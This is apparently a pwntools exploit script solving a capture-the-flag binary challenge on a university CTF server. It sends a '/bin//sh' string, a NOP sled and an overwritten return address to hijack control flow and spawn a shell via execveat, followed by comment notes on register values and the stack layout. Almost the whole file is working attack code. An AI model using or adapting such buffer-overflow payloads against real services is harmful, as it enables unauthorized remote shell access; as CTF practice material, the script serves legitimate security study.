from pwn import *

host, port = "ctf.adl.csie.ncu.edu.tw", 11007
p = remote(host, port)
context.arch = "amd64"

p.sendline(b"/bin//sh\x00" + b"\x90"*287 + p64(0x4000ed) + b"\x90"*17)

p.interactive()


'''
rax = 322 = stub_execveat
sh -> 27 bytes = 0x1b
end - read(0, 0x7fffffffffffdd10, 0x148)
rax = 0
rdx = 0x148
rdi = 0
rsi = 0 = rsp - 0x128 = 0x7fffffffffffdd10
ret addr = 0x7fffffffde38
'''


